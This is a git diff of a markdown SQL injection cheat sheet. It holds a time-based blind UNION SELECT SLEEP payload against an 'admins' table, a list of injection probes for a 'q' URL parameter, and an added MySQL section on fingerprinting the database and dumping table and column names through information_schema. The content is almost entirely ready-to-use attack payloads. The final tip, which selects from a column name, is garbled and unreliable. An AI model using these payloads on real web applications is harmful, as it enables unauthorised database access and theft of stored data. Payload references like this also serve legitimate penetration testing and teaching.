@@ -30,7 +30,7 @@ We are logged in !
 - `'UNION SELECT SLEEP(1*CHAR_LENGTH(username)) FROM admins;#`
 
 ## List
-
+```
 /?q=1
 /?q=1'
 /?q=1"
@@ -44,8 +44,10 @@ We are logged in !
 /?q=1' or '1'='1
 /?q=1 or 1=1
 /?q='or''='
+```
 
 ---
+
 
 ## Sandboxes databases
 By @hackerscrolls
@@ -78,3 +80,18 @@ SQLite
 MySQL
 PostgreSQL
 MS SQL Server 2017
+
+## Useful ones in MySQL
+
+current_user()
+version()
+database()
+
+
+### information_schema.columns table
+
+table_name / column_name (you can use CONCAT : UNION SELECT 1,2,concat(table_name, ':', column_name) ...) FROM information_schema.columns
+
+Then use the value from column_name to found useful information
+
+SELECT * from <column_name>
